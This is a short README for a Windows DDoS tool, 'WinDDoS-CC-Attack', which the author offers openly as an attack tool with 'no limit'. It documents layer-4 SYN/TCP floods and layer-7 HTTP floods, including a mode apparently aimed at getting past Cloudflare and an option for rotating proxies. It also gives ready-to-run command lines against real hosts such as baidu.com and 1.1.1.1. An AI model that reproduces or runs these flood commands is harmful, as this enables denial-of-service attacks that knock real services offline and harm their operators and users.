# WinDDoS-CC-Attack Version 1.1

Written By Unicode (ImageWorkshop)  
It's a Internet attack tool, you can use it for your attack & it has no limit  
L4 mode -DDoS  
L7 mode -CC  
I tried on 2h4g azure  
5w/s in https://dstat.cc/  XD  
****
Usage: main.exe -L7 Url threads time mode [proxy]  
       main.exe -L4 IP Port threads time -SYN/-tcp PacketSize(byte)  

2.Examples:
main.exe -L7 http://www.baidu.com/ 500 120 -normal proxy.txt  
main.exe -L7 http://www.baidu.com/ 500 120 -cf proxy.txt  
main.exe -L7 http://www.baidu.com/ 500 120 -normal  
main.exe -L7 http://www.baidu.com/ 500 120 -cf  
main.exe -L4 1.1.1.1 80 500 120 -SYN 65500  
main.exe -L4 1.1.1.1 80 500 120 -tcp 65500  

UDP mode will be supported in the future  
